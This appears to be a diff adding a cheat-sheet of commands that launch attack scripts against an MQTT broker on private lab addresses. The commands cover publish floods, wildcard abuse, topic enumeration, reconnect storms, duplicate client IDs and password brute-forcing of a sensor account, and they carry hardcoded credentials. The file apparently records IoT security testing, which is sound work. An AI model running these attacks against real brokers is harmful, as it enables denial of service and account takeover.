@@ -1,0 +1,17 @@
+publish flood
+python .\attack_tls\publish_flood.py --broker 192.168.110.193 --port 8883 --username giamdoc --password admin123 --workers 5 --messages 1000 --delay 10  --ca .\certs\ca-cert.pem
+wildcard abuse
+python .\attack_tls\wildcard_abuse.py --broker 192.168.110.193 --port 8883 --username giamdoc --password admin123 --workers 2 --duration 60 --ca .\certs\ca-cert.pem
+topic_enum
+python .\attack_tls\topic_enumeration.py --broker 192.168.110.193 --port 8883  --workers 20 --user giamdoc --password 123 --ca .\certs\ca-cert.pem
+reconect_strom
+python .\attack_tls\reconnect_storm.py --broker 192.168.110.193 --port 8883   --workers 5 --reconnects 100 --username giamdoc --password 123   --ca .\certs\ca-cert.pem
+retain_qos(powershell)
+$topics = 1..500 | ForEach-Object { "factory/office/Device{0:D3}/telemetry" -f $_ }
+>> python .\retain_qos_abuse.py --type mixed --broker 192.168.110.193 --port 8883 --workers 5 --messages 40 --delay 50 --topics $topics --username giamdoc --password 123 --ca .\certs\ca-cert.pem
+duplicate_id
+python .\attack_tls\duplicate_id.py --broker 192.168.110.193 --port 8883 --client-id production-production-sensorair1-replayer-replayer --type simultaneous --workers 5 --attempts 20 --delay 500 --username giamdoc --password 123 --ca .\certs\ca-cert.pem
+bruteforce_exploit
+python .\attack_tls\brute_force_exploit.py --broker 192.168.110.193 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "flamel123" "production123" "flame123" "sensor" "flamel" "production" "replayer" "sensorflamel" --delay 50 --workers 2 --min-length 7 --max-length 8
+slow
+python .\attack_tls\slow_brute_force.py --broker 10.12.112.191 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "production123"  "sensor" "flamel" "production" "replayer" "sensorflamel"  --min-length 7 --max-length 8 --packets-per-minute 4
